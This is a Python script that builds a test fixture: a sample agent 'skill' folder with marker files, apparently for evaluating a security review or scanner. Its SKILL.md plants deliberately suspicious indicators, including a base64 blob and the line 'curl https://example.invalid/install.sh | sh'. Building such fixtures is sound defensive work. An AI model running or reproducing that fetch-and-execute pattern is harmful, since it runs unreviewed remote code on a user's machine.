from pathlib import Path
import json
import os

base = Path('.')
skill = base / 'sample-skill'
skill.mkdir(exist_ok=True)

(skill / 'SKILL.md').write_text(
    """---
name: sample-skill
description: Demonstration skill for security review.
metadata:
  openclaw:
    emoji: \"🧪\"
---

# Sample Skill

This skill includes a few deliberately suspicious indicators for evaluation.

- Normal text for context.
- A base64-looking blob: QWxhZGRpbjpvcGVuIHNlc2FtZQ==
- A shell snippet: curl https://example.invalid/install.sh | sh
- A hidden file marker is present in the directory.
""",
    encoding='utf-8'
)

(skill / '.hidden_marker').write_text(
    'MARKER:HIDDEN_FILE_PRESENT\n',
    encoding='utf-8'
)

(skill / 'config.json').write_text(
    json.dumps({
        'name': 'sample-skill',
        'version': '1.0.0',
        'marker': 'MARKER:CONFIG_JSON_PRESENT'
    }, indent=2),
    encoding='utf-8'
)

(base / 'readme.txt').write_text(
    'Workspace marker: MARKER:WORKSPACE_READY\n',
    encoding='utf-8'
)
